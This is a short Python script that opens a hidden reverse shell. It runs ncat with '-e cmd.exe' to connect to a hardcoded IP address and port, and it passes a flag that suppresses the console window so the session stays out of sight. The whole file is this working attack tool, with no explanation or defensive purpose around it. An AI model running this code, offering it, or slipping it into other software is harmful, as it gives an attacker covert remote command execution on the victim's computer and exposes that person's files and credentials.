import subprocess
import sys
import time

client_ip = "10.12.75.36"
port = 9999

def persistent_shell(client_ip, port):
    try:
        command = [
            "ncat",
            client_ip,
            str(port),
            "-e", "cmd.exe",
            
        ]

        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW  # Better for background processes
        )
        
        # Check process status
        time.sleep(3)  # Wait for connection attempt
        if process.poll() is not None:
            error = process.stderr.read().decode()
            print(f"Connection failed: {error}")
            return False
            
        return True

    except Exception as e:
        print(f"Execution error: {str(e)}")
        return False

# Test connection
if persistent_shell(client_ip, port):
    print("Connection initiated successfully")
else:
    print("Failed to establish connection")